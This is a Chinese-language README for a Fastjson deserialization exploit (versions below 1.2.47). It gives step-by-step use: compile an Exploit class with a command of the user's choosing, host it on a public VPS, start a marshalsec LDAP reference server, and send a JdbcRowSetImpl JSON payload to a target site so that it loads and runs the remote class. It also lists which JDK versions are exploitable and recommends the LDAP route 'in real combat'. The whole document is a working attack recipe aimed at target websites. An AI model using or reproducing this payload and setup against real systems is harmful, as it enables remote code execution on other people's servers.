## 使用方法：

1. 编译Exploit.java文件

   > 可根据需求修改其中的执行命令

   ```java
   javac Exploit.java
   ```

2. 将编译后的Exploit.class放到公网vps（能够使用http去访问到）

3. 将`marshalsec-0.0.3-SNAPSHOT-all.jar`放到公网vps上，注意公网vps需配置和java环境

   执行如下命令启用ldap服务：

   ```java
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://公网vpsHTTP的IP:端口/#Exploit” 9999
   ```

4. 在目标网站上执行如下EXP即可出发Exploit.class中的命令

   ```json
   
   {
       "a": {
           "@type": "java.lang.Class", 
           "val": "com.sun.rowset.JdbcRowSetImpl"
       }, 
       "b": {
           "@type": "com.sun.rowset.JdbcRowSetImpl", 
           "dataSourceName": "ldap://公网vps的ip:9999/Exploit", 
           "autoCommit": true
       }
   }
   ```




## 注意事项：

fastjson版本需低于1.2.47

目标网站的jdk版本不能过高，高版本的java对jndi注入进行了限制，具体要求如下：

基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。 在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。 基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。 在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。 可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。



## 演示视频：

https://www.bilibili.com/video/BV1La4y147fj

